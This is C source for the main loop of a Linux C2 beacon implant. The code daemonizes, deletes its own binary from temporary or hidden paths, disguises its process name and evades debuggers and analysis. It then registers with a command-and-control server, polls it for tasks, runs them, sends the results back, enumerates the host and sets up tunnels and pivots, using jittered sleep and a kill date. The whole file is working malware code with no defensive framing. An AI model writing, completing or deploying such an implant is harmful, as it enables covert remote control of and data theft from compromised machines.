/**
 * Linux beacon - Main loop
 *
 * Daemonizes, connects to C2, processes tasks
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"
#include "../../include/evasion.h"
#include "../../include/process.h"
#include "../../include/pivot.h"
#include "../../include/postex.h"
#include "../../include/random.h"

static IMPLANT_CONFIG g_config;

static void init_config(void) {
    memset(&g_config, 0, sizeof(g_config));

    strncpy(g_config.c2_url, C2_URL, sizeof(g_config.c2_url) - 1);
    strncpy(g_config.checkin_path, C2_CHECKIN_PATH, sizeof(g_config.checkin_path) - 1);
    strncpy(g_config.register_path, C2_REGISTER_PATH, sizeof(g_config.register_path) - 1);
    strncpy(g_config.result_path, C2_RESULT_PATH, sizeof(g_config.result_path) - 1);
    strncpy(g_config.tunnel_path, C2_TUNNEL_PATH, sizeof(g_config.tunnel_path) - 1);
    strncpy(g_config.user_agent, USER_AGENT, sizeof(g_config.user_agent) - 1);

    g_config.sleep_seconds  = SLEEP_SECONDS;
    g_config.jitter_percent = JITTER_PERCENT;
    g_config.max_retries    = MAX_RETRIES;
    g_config.kill_date      = KILL_DATE;
    g_config.running        = TRUE;
}

static void generate_implant_id(void) {
    unsigned seed = 0;
    if (secure_random_bytes(&seed, sizeof(seed)) != 0)
        seed = (unsigned)(time(NULL) ^ getpid());
    snprintf(g_config.implant_id, sizeof(g_config.implant_id),
             "%08X-%04X", seed, (unsigned)(getpid() & 0xFFFF));
}

static void self_delete(void) {
    char exe[512];
    ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (n > 0) {
        exe[n] = '\0';
        if (strncmp(exe, "/tmp/", 5) == 0 || strncmp(exe, "/dev/shm/", 9) == 0
                || strstr(exe, "/.") != NULL)
            unlink(exe);
    }
}

static void daemonize(void) {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    setsid();
    self_delete();
    umask(0);
    chdir("/");
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, STDIN_FILENO);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        if (devnull > STDERR_FILENO) close(devnull);
    }
}

static int check_kill_date(void) {
    if (g_config.kill_date == 0) return 0;
    time_t now = time(NULL);
    return now >= (time_t)g_config.kill_date;
}

static unsigned compute_sleep_ms(void) {
    unsigned base_ms = g_config.sleep_seconds * 1000;
    if (g_config.jitter_percent == 0) return base_ms;

    unsigned jitter_range = (base_ms * g_config.jitter_percent) / 100;
    unsigned jitter = (unsigned)secure_random_int(0, (int)jitter_range);

    if (secure_random_int(0, 1))
        return base_ms + jitter;
    return (base_ms > jitter) ? base_ms - jitter : base_ms;
}

static void beacon_sleep(unsigned ms) {
#if HEAP_ENCRYPT
    sleep_encrypt_heap((int)ms);
#else
    usleep(ms * 1000);
#endif
}

static FILE *g_dbg = NULL;
static void dbg(const char *fmt, ...) {
    if (!g_dbg) g_dbg = fopen("/tmp/.c2dbg.log", "a");
    if (!g_dbg) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(g_dbg, fmt, ap);
    va_end(ap);
    fflush(g_dbg);
}

static void process_tasks(PC2_TASK tasks, DWORD count) {
    dbg("[%d] process_tasks: %u tasks\n", getpid(), count);
    for (DWORD i = 0; i < count; i++) {
        C2_RESULT result;
        memset(&result, 0, sizeof(result));
        strncpy(result.task_id, tasks[i].id, sizeof(result.task_id) - 1);

        dbg("[%d] task[%u] id=%s type=%u data_sz=%u\n", getpid(), i,
            tasks[i].id, tasks[i].type, tasks[i].data_size);
        task_dispatch(&g_config, &tasks[i], &result);
        dbg("[%d] task[%u] dispatched, result_sz=%u err=%s\n", getpid(), i,
            result.data_size, result.error[0] ? result.error : "none");

        if (result.data == NULL && result.data_size == 0 && result.error[0] == '\0') {
            result.data = (BYTE *)strdup("OK");
            result.data_size = 2;
        }

        dbg("[%d] task[%u] sending result...\n", getpid(), i);
        if (!transport_send_result(&g_config, &result)) {
            dbg("[%d] task[%u] send_result FAILED\n", getpid(), i);
            free(result.data);
            for (DWORD j = i; j < count; j++) free(tasks[j].data);
            return;
        }
        dbg("[%d] task[%u] send_result OK\n", getpid(), i);

        free(tasks[i].data);
        tasks[i].data = NULL;
        free(result.data);

        if (!g_config.running) {
            for (DWORD j = i + 1; j < count; j++) free(tasks[j].data);
            return;
        }
    }
}

void beacon_main(void) {
    dbg("[%d] beacon_main start\n", getpid());
    init_config();
    generate_implant_id();
    dbg("[%d] config: c2_url=%s kill_date=%u\n", getpid(), g_config.c2_url, g_config.kill_date);

    if (check_kill_date()) { dbg("[%d] KILL DATE expired\n", getpid()); return; }

#if ANTI_ANALYSIS
    dbg("[%d] anti_analysis check...\n", getpid());
    if (anti_analysis_gate()) {
        dbg("[%d] anti_analysis BLOCKED\n", getpid());
        sleep(600);
        return;
    }
    dbg("[%d] anti_analysis OK\n", getpid());
#endif

    masquerade_process(MASQUERADE_NAME);

    dbg("[%d] calling transport_init\n", getpid());
    if (!transport_init(&g_config)) {
        dbg("[%d] transport_init FAILED\n", getpid());
        return;
    }
    dbg("[%d] transport_init OK\n", getpid());

    tunnel_init(&g_config);
    auto_enum_run();

    DWORD retries = 0;
    dbg("[%d] starting registration loop, max_retries=%u\n", getpid(), g_config.max_retries);
    while (!transport_register(&g_config)) {
        dbg("[%d] register attempt %u/%u failed\n", getpid(), retries+1, g_config.max_retries);
        if (++retries >= g_config.max_retries) {
            dbg("[%d] max retries reached - exiting\n", getpid());
            transport_cleanup();
            return;
        }
        beacon_sleep(compute_sleep_ms());
    }
    dbg("[%d] registered OK\n", getpid());
    auto_enum_release();

    DWORD base_sleep = g_config.sleep_seconds;
    DWORD consecutive_failures = 0;
    DWORD backoff_cap = 3600;

    while (g_config.running) {
        if (check_kill_date()) {
            g_config.running = FALSE;
            break;
        }

#if ANTI_ANALYSIS
        if (check_ptrace() || check_proc_status()) {
            beacon_sleep(300000);
            continue;
        }
#endif

        PC2_TASK tasks = NULL;
        DWORD task_count = 0;

        dbg("[%d] checkin...\n", getpid());
        if (transport_checkin(&g_config, &tasks, &task_count)) {
            dbg("[%d] checkin OK, tasks=%u\n", getpid(), task_count);
            tunnel_poll(&g_config);

            if (task_count > 0 && tasks != NULL) {
                process_tasks(tasks, task_count);
                free(tasks);
            }

            if (consecutive_failures > 0) {
                g_config.sleep_seconds = base_sleep;
                consecutive_failures = 0;
            }
        } else {
            consecutive_failures++;
            if (consecutive_failures >= g_config.max_retries) {
                DWORD new_sleep = g_config.sleep_seconds * 2;
                if (new_sleep > backoff_cap) new_sleep = backoff_cap;
                g_config.sleep_seconds = new_sleep;
            }
            if (consecutive_failures > 0 &&
                (consecutive_failures % (g_config.max_retries * 3)) == 0) {
                transport_register(&g_config);
            }
        }

        beacon_sleep(compute_sleep_ms());
    }

    pivot_cleanup();
    transport_cleanup();
}

int main(int argc, char **argv) {
    save_original_argv(argc, argv);
    signal(SIGCHLD, SIG_IGN);
#if DEBUG_NODAEMON
    fprintf(stderr, "[DEBUG] Skipping daemonize (debug mode)\n");
#else
    daemonize();
#endif
    beacon_main();
    return 0;
}
